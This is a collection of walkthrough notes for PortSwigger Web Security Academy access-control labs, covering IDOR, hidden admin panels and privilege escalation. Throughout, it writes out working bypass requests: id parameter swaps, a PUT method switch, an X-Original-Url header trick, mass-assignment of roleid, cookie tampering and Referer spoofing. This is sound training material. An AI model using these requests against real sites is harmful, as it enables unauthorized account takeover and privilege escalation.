```
Lab: User ID controlled by request parameter with data leakage in redirect

APPRENTICE

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter 
```

Replace id = wiener by carlos and see the response in Burp

GG wp ...

---
```
Lab: User ID controlled by request parameter with password disclosure

APPRENTICE

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```

Replace id = wiener by administrator, change the password and look in burp


---
```
Lab: Insecure direct object references

APPRENTICE

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account. 
```

Download : 1.txt 

---
```
This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
```
Change methode POST > PUT 
```
PUT /admin-roles
username=wiener&action=upgrade
```
> Congratulations, you solved the lab!

---

```
This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos. 
```

Open the inspector and check source code :

```
adminPanelTag.setAttribute('href', '/admin-f8nyzl');
adminPanelTag.innerText = 'Admin panel';
```

> Congratulations, you solved the lab!

---
```
This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos. 
```

```
──(kali㉿kali)-[/mnt/portswigger/mfa]
└─$ dirb https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 12 16:50:11 2023
URL_BASE: https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/ ----
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/analytics (CODE:200|SIZE:0)                                                           
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/favicon.ico (CODE:200|SIZE:15406)                                                     
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/filter (CODE:200|SIZE:10402)                                                          
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/login (CODE:200|SIZE:2879)                                                            
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/Login (CODE:200|SIZE:2879)                                                            
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/logout (CODE:302|SIZE:0)                                                              
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/my-account (CODE:302|SIZE:0)                                                          
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/product (CODE:400|SIZE:30)                                                            
+ https://0a5f0064031dfb6382f451c600a9003a.web-security-academy.net/robots.txt (CODE:200|SIZE:45)                                                         
                                                                               zt                                                                         
-----------------
END_TIME: Fri May 12 16:53:55 2023
DOWNLOADED: 4612 - FOUND: 9
```

Content inside robots.txt : 
```
User-agent: *
Disallow: /administrator-panel
```

> Congratulations, you solved the lab!

---

```
This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos. 
```

[URL rewrite vulnerability](https://www.acunetix.com/vulnerabilities/web/url-rewrite-vulnerability/)

```
GET / HTTP/2
X-Original-Url: /admin
```
You gain access to the admin page, then delete Carlos ...
```
GET /?username=carlos HTTP/2
Host: 0a0c0091039c87418156200700350087.web-security-academy.net
X-Original-Url: /admin/delete
```

> Congratulations, you solved the lab!

---

```
This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter 
```

Carlos GUID is in Carlos blog post

So use this id :)

> Congratulations, you solved the lab!

---

```
This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter 
```
Change :
GET /my-account?id=wiener

Into :
GET /my-account?id=carlos

> Congratulations, you solved the lab!

---

```
This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```

POST /my-account/change-email 
{"email":"test@test.com"}

Response :
{
  "username": "wiener",
  "email": "test@test.com",
  "apikey": "gqLd1cVIhE4aCK95vpgvSjhGzZLEUrs9",
  "roleid": 1
}

Change that for modify the roleid

POST /my-account/change-email 
{
    "email":"test@test.com",
    "roleid":2
}

Response :
{
  "username": "wiener",
  "email": "test@test.com",
  "apikey": "gqLd1cVIhE4aCK95vpgvSjhGzZLEUrs9",
  "roleid": 2
}

GG !

Go to /admin

> Congratulations, you solved the lab!

---

```
This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```

Intercept all the request when you go on /admin
replace admin=false by admin=true

> Congratulations, you solved the lab!

---

```
Lab: Multi-step process with no access control on one step

PRACTITIONER

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
```
```
POST /admin-roles
action=upgrade&confirmed=true&username=wiener
```


---

```
Lab: Referer-based access control

PRACTITIONER

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
```
```
GET /admin-roles?username=wiener&action=upgrade
Referer: https://0a9b00170444c36f81d95ca5008400be.web-security-academy.net/admin
```

---

